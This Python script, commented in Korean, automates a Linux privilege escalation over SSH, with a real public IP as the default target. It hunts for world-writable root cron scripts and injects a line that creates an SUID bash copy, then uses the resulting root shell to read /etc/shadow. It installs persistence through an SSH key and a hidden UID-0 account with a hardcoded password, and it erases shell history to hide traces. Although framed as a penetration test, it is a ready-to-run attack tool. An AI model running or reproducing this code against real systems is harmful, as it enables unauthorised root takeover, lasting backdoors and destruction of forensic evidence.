#!/usr/bin/env python3
"""
낮은 권한 → Root 권한 상승 자동화 스크립트

시나리오:
  dev-junior 계정 (sudo 없음) → Cron Job 악용 → Root 획득

공격 벡터:
  1. 쓰기 가능한 Cron 스크립트 찾기 (777 권한)
  2. SUID rootbash 생성 코드 삽입
  3. Cron 실행 대기 (5분)
  4. rootbash -p 실행 → Root 쉘
"""

import paramiko
import time
import sys
import getpass
from datetime import datetime

class LowPrivilegeEscalation:
    def __init__(self, target_ip, username, password):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.ssh = None
        self.vulnerabilities = []

    def log(self, level, message):
        """로그 출력"""
        colors = {
            'INFO': '\033[94m',
            'SUCCESS': '\033[92m',
            'WARNING': '\033[93m',
            'ERROR': '\033[91m',
            'ENDC': '\033[0m'
        }
        color = colors.get(level, colors['INFO'])
        print(f"{color}[{level}]{colors['ENDC']} {message}")

    def connect_ssh(self):
        """SSH 연결"""
        self.log('INFO', f'Connecting to {self.username}@{self.target_ip}...')

        try:
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh.connect(
                self.target_ip,
                username=self.username,
                password=self.password,
                timeout=10
            )
            self.log('SUCCESS', 'SSH connected successfully!')
            return True

        except paramiko.AuthenticationException:
            self.log('ERROR', 'Authentication failed')
            return False
        except Exception as e:
            self.log('ERROR', f'Connection failed: {str(e)}')
            return False

    def execute_command(self, command, sudo=False):
        """SSH 명령 실행"""
        try:
            if sudo:
                command = f'echo {self.password} | sudo -S {command}'

            stdin, stdout, stderr = self.ssh.exec_command(command)
            output = stdout.read().decode('utf-8')
            error = stderr.read().decode('utf-8')

            return {
                'output': output,
                'error': error,
                'exit_code': stdout.channel.recv_exit_status()
            }
        except Exception as e:
            return {
                'output': '',
                'error': str(e),
                'exit_code': 1
            }

    def check_current_privileges(self):
        """현재 권한 확인"""
        self.log('INFO', '=== Phase 1: Current Privileges ===')
        print()

        # whoami
        result = self.execute_command('whoami')
        self.log('INFO', f'User: {result["output"].strip()}')

        # id
        result = self.execute_command('id')
        self.log('INFO', f'Groups: {result["output"].strip()}')

        # sudo check
        result = self.execute_command('sudo -l')
        if 'may not run sudo' in result['error'] or 'may not run sudo' in result['output']:
            self.log('WARNING', 'No sudo privileges')
        else:
            self.log('SUCCESS', 'Some sudo privileges available:')
            print(result['output'])

        print()

    def search_writable_cron_scripts(self):
        """쓰기 가능한 Cron 스크립트 검색"""
        self.log('INFO', '=== Phase 2: Searching Writable Cron Scripts ===')
        print()

        # /etc/crontab 확인
        self.log('INFO', 'Checking /etc/crontab...')
        result = self.execute_command('cat /etc/crontab')

        if result['exit_code'] == 0:
            crontab = result['output']

            # Root로 실행되는 스크립트 찾기
            import re
            root_crons = re.findall(r'root\s+(\S+)', crontab)

            if root_crons:
                self.log('SUCCESS', f'Found {len(root_crons)} root cron jobs:')

                for script in root_crons:
                    if script.startswith('/'):
                        print(f'  - {script}')

                        # 파일 권한 확인
                        result = self.execute_command(f'ls -la {script}')

                        if result['exit_code'] == 0:
                            permissions = result['output']

                            # 777 권한 확인
                            if 'rwxrwxrwx' in permissions:
                                self.log('SUCCESS', f'  VULNERABLE: {script} (777 permissions!)')
                                self.vulnerabilities.append({
                                    'type': 'Writable Cron Script',
                                    'path': script,
                                    'severity': 'CRITICAL'
                                })
                            elif 'rw-' in permissions[7:10]:  # 그룹 쓰기 가능
                                self.log('WARNING', f'  Potential: {script} (group writable)')
                            else:
                                self.log('INFO', f'  Secure: {script}')

        print()
        return len(self.vulnerabilities) > 0

    def search_suid_binaries(self):
        """SUID 바이너리 검색"""
        self.log('INFO', '=== Phase 3: Searching SUID Binaries ===')
        print()

        self.log('INFO', 'Finding SUID binaries (this may take a while)...')
        result = self.execute_command('find / -perm -4000 -type f 2>/dev/null')

        if result['output']:
            suid_bins = result['output'].strip().split('\n')

            dangerous_bins = ['find', 'vim', 'nano', 'less', 'more', 'python', 'perl', 'ruby']

            self.log('SUCCESS', f'Found {len(suid_bins)} SUID binaries:')

            for binary in suid_bins[:10]:  # 처음 10개만
                print(f'  - {binary}')

                # 위험한 바이너리 체크
                for dangerous in dangerous_bins:
                    if dangerous in binary.lower():
                        self.log('SUCCESS', f'  DANGEROUS: {binary}')
                        self.vulnerabilities.append({
                            'type': 'Dangerous SUID Binary',
                            'path': binary,
                            'severity': 'HIGH'
                        })

        print()

    def exploit_writable_cron(self, script_path):
        """쓰기 가능한 Cron 스크립트 악용"""
        self.log('INFO', '=== Phase 4: Exploiting Writable Cron Script ===')
        print()

        self.log('INFO', f'Target script: {script_path}')

        # 원본 백업
        self.log('INFO', 'Creating backup of original script...')
        result = self.execute_command(f'cat {script_path}')
        original_content = result['output']

        # 백도어 코드
        backdoor_code = 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'

        self.log('INFO', 'Injecting backdoor code...')
        result = self.execute_command(f'echo "{backdoor_code}" >> {script_path}')

        if result['exit_code'] == 0:
            self.log('SUCCESS', 'Backdoor injected successfully!')

            # 확인
            result = self.execute_command(f'tail -1 {script_path}')
            self.log('INFO', f'Last line: {result["output"].strip()}')

            return True
        else:
            self.log('ERROR', f'Failed to inject: {result["error"]}')
            return False

    def wait_for_cron(self, wait_minutes=6):
        """Cron 실행 대기"""
        self.log('INFO', f'=== Phase 5: Waiting for Cron ({wait_minutes} minutes) ===')
        print()

        self.log('WARNING', f'Waiting for cron to execute (max {wait_minutes} minutes)...')

        start_time = time.time()

        while time.time() - start_time < wait_minutes * 60:
            # rootbash 생성 확인
            result = self.execute_command('ls -la /tmp/rootbash')

            if result['exit_code'] == 0 and '-rwsr-sr-x' in result['output']:
                elapsed = int(time.time() - start_time)
                self.log('SUCCESS', f'rootbash created after {elapsed} seconds!')
                print(result['output'])
                return True

            # 30초마다 체크
            time.sleep(30)
            print('.', end='', flush=True)

        print()
        self.log('ERROR', 'Timeout: Cron did not execute')
        return False

    def get_root_shell(self):
        """Root 쉘 획득"""
        self.log('INFO', '=== Phase 6: Getting Root Shell ===')
        print()

        # rootbash 확인
        result = self.execute_command('ls -la /tmp/rootbash')

        if result['exit_code'] != 0:
            self.log('ERROR', '/tmp/rootbash not found')
            return False

        self.log('SUCCESS', 'Executing /tmp/rootbash -p')

        # Root 명령 실행 테스트
        commands = [
            ('whoami', 'User check'),
            ('id', 'ID check'),
            ('cat /etc/shadow | head -3', 'Shadow file access')
        ]

        for cmd, desc in commands:
            result = self.execute_command(f'/tmp/rootbash -p -c "{cmd}"')

            if result['exit_code'] == 0:
                self.log('SUCCESS', f'{desc}: {result["output"].strip()[:100]}')
            else:
                self.log('ERROR', f'{desc} failed')

        print()
        return True

    def install_backdoor(self):
        """백도어 설치"""
        self.log('INFO', '=== Phase 7: Installing Persistent Backdoor ===')
        print()

        # SSH 키 백도어
        self.log('INFO', 'Installing SSH key backdoor...')

        ssh_key = input('Enter your SSH public key (or press Enter to skip): ').strip()

        if ssh_key:
            cmd = f'/tmp/rootbash -p -c "mkdir -p /root/.ssh && echo \\"{ssh_key}\\" >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys"'
            result = self.execute_command(cmd)

            if result['exit_code'] == 0:
                self.log('SUCCESS', 'SSH key installed in /root/.ssh/authorized_keys')
            else:
                self.log('ERROR', f'Failed: {result["error"]}')

        # 새로운 root 사용자 생성
        self.log('INFO', 'Creating backdoor user...')

        backdoor_user = 'backup-admin'
        backdoor_pass = 'Backup2024!'

        cmd = f'/tmp/rootbash -p -c "useradd -ou 0 -g 0 {backdoor_user} && echo {backdoor_user}:{backdoor_pass} | chpasswd"'
        result = self.execute_command(cmd)

        if result['exit_code'] == 0:
            self.log('SUCCESS', f'Backdoor user created: {backdoor_user}:{backdoor_pass}')

        print()

    def cleanup(self):
        """흔적 제거"""
        self.log('INFO', '=== Phase 8: Cleanup ===')
        print()

        cleanup_choice = input('Do you want to cleanup traces? (y/n): ').strip().lower()

        if cleanup_choice == 'y':
            # rootbash 삭제
            self.log('INFO', 'Removing /tmp/rootbash...')
            self.execute_command('rm -f /tmp/rootbash')

            # 히스토리 삭제
            self.log('INFO', 'Cleaning command history...')
            self.execute_command('cat /dev/null > ~/.bash_history')

            self.log('SUCCESS', 'Cleanup completed')
        else:
            self.log('WARNING', 'Skipping cleanup (forensic traces remain)')

        print()

    def generate_report(self):
        """보고서 생성"""
        self.log('INFO', '=== Penetration Test Report ===')
        print()

        print(f'Target: {self.target_ip}')
        print(f'User: {self.username}')
        print(f'Timestamp: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
        print()

        print(f'Vulnerabilities Found: {len(self.vulnerabilities)}')
        for vuln in self.vulnerabilities:
            print(f'  - {vuln["type"]}: {vuln["path"]} ({vuln["severity"]})')

        print()

        if self.vulnerabilities:
            self.log('SUCCESS', 'Privilege escalation SUCCESSFUL!')
        else:
            self.log('WARNING', 'No exploitable vulnerabilities found')

        print()

    def run(self):
        """전체 공격 실행"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  Low Privilege → Root Escalation                          ║")
        print("╚" + "═"*58 + "╝")
        print()

        # SSH 연결
        if not self.connect_ssh():
            return False

        try:
            # Phase 1: 권한 확인
            self.check_current_privileges()

            # Phase 2: 취약한 Cron 스크립트 찾기
            has_writable_cron = self.search_writable_cron_scripts()

            # Phase 3: SUID 바이너리 찾기
            self.search_suid_binaries()

            if not has_writable_cron:
                self.log('WARNING', 'No writable cron scripts found')
                self.log('INFO', 'Try exploiting SUID binaries instead')
                self.generate_report()
                return False

            # Phase 4: Cron 스크립트 악용
            target_script = self.vulnerabilities[0]['path']

            proceed = input(f'Exploit {target_script}? (y/n): ').strip().lower()

            if proceed != 'y':
                self.log('WARNING', 'Attack aborted by user')
                return False

            if not self.exploit_writable_cron(target_script):
                return False

            # Phase 5: Cron 실행 대기
            if not self.wait_for_cron():
                return False

            # Phase 6: Root 쉘 획득
            if not self.get_root_shell():
                return False

            # Phase 7: 백도어 설치
            install = input('Install persistent backdoor? (y/n): ').strip().lower()
            if install == 'y':
                self.install_backdoor()

            # Phase 8: 흔적 제거
            self.cleanup()

            # 보고서
            self.generate_report()

            return True

        finally:
            if self.ssh:
                self.ssh.close()

def main():
    print()
    print("═"*60)
    print("Low Privilege to Root - Automated Privilege Escalation")
    print("═"*60)
    print()

    # 대상 정보 입력
    target_ip = input('Target IP (default: 3.35.218.180): ').strip() or '3.35.218.180'
    username = input('Username (default: dev-junior): ').strip() or 'dev-junior'
    password = getpass.getpass('Password: ')

    if not password:
        print('[ERROR] Password required')
        sys.exit(1)

    # 공격 실행
    exploit = LowPrivilegeEscalation(target_ip, username, password)
    success = exploit.run()

    sys.exit(0 if success else 1)

if __name__ == '__main__':
    main()
